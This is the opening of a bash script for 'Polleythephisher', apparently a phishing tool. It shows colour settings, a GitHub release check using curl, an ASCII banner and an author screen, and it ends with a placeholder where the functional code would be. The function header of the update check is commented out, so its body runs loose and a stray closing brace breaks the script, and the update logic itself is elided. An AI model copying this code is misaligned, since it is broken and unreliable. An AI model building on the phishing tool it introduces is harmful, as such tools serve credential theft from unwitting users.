#!/bin/bash

##   Tool Name  :   Polleythephisher
##   Author     :   Ankon Polley 
##   Version    :   2.3.5
##   Github     :   https://github.com/anknpolley123/Polleythephisher.git

__version__="2.3.5"

## ANSI colors
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
WHITE="$(printf '\033[37m')" CYAN="$(printf '\033[36m')"

# Check for a newer release from your repo
#check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
	relase_url='https://api.github.com/repos/anknpolley123/Polleythephisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/anknpolley123/Polleythephisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ && ! -z "$new_version" ]]; then
		echo -ne "${ORANGE}update found\n"${WHITE}
		# ... update logic ...
	else
		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
	fi
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}  _____           _ _           _   _            
		${ORANGE} |  __ \         | | |         | | | |           
		${ORANGE} | |__) |__  _   | | | ___ _   | |_| |__   ___   
		${ORANGE} |  ___/ _ \| |  | | |/ _ \ |  | __| '_ \ / _ \  
		${ORANGE} | |  | (_) | |__| | |  __/ |_ | |_| | | |  __/  
		${ORANGE} |_|   \___/ \____/|_|\___|\__| \__|_| |_|\___|  
		${ORANGE}                                                 
		${ORANGE}      Polleythephisher   ${RED}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Modified by Ankon Polley${WHITE}
	EOF
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}Ankon Polley ${RED}[ ${ORANGE}Polley ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/anknpolley123
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
        ...
	EOF
}

# [Rest of the functional script follows...]